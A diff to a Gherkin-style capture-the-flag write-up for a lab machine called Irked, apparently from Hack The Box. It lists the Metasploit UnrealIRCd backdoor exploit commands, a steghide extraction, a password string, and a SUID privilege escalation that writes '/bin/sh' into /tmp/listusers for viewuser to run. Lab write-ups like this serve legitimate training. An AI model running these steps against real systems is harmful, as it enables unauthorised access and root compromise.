@@ -43,13 +43,13 @@ Feature:
     Service Info: OSs: Windows, Windows XP; CPE:
     cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
     """
-    Then I can see that it has a service http and irc 
+    And I can see that it has a service http and irc
 
-  Scenario: Exploitation
+  Scenario: success
     Given the machine has SMB and NetBios services
-    Then Then he decided to run the port 80
+    Then he decided to run the port 80
     And only contains a website with an image
-    Then I decide to download the image to scan it with
+    Then I decide to download the image to scan it with:
     """
     $ steghide extract -sf irked.jpg
     """
@@ -60,6 +60,7 @@ Feature:
     msf5> use exploit/unix/irc/unreal_ircd_3281_backdoor
     """
     Then I configure the RHOST
+    And the remote ip is as follows
     """
     msf5> set RHOSTS 10.10.10.117
     """
@@ -68,10 +69,11 @@ Feature:
     msf5> set RPORT 8067
     """
     Then I execute an instruction to run the exploit
+    And serves to run the exploit
     """
     msf5> exploit
     """
-    Then I can execute commands
+    And I can execute commands
     Then I use one to go home
     """
     ~$ cd /home
@@ -81,11 +83,12 @@ Feature:
     """
     ~/home$ cd djmardov
     """
-    Then use
+    Then I use an instruction
+    And it serves to go to documents
     """
     ~/home/djmardov$ cd Documents
     """
-    Then I see that there is a user.txt 
+    Then I see that there is a user.txt
     And not have permissions
     Then I execute command
     """
@@ -93,7 +96,11 @@ Feature:
     """
     Then I see that there is a file named backup
     And has a password
+    """
+    $ JPupDOWNdownLRlrBAbaSSss
+    """
     Then I execute command
+    And it serves to decrypt the file
     """
     $ steghide extract -sf irked.jpg
     """
@@ -102,25 +109,29 @@ Feature:
     """
     $ cat pass.txt
     """
-    Then I execute the ssh con el pass.txt
+    Then I run the SSH with the pass.txt
     And I execute command
     """
     ~/Documents$ find / -perm -u=s -type=f 2>/dev/null
     """
-    Then I execute command
+    Then I execute an instruction
+    And it is to make a fork
     """
     ~/Documents$ echo '/bin/sh' > /tmp/listusers
     """
-    And executed a command to give permissions
+    Then I must grant permissions
+    And it is for the following directory:
     """
     ~/Documents$ chmod 777 /tmp/listusers
     """
     Then I execute the file
+    And it is to configure and test user permissions:
     """
     ~/Documents$ /usr/bin/viewuser
     """
     Then I'm going to stop at that root
+    And I can see that there is a file with the flag
     """
     # cd /root
     """
-    And finally you get the FLAGS with cat
+    And finally I get the FLAGS with cat
